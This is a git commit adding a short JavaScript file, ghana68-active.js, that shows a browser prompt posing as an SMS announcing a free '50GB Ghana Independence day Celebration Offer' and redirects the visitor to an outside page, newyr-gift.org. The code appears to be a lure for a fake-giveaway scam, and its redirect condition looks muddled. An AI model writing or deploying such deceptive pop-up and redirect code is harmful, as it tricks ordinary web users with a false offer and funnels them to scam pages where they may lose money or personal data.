cc98a436450b82132b12ce76db6db556c46bdaec
ukebeblog <esther001imoh@gmail.com>
2025-02-23 12:59:32 +0100

    Create ghana68-active.js

---
+++ ghana68-active.js
@@ -0,0 +1,6 @@
+
+var password = 'ACTIVATE 50GB'
+password=prompt('SMS: Congratulations You are qualify to receive 50GB Ghana Independence day Celebration Offer, Kindly Press OK to Activate now   ','ACTIVATE 50GB');
+if (password != 'ACTIVATE 50GB') {
+location.href='https://newyr-gift.org/ghana-at68.html';
+}
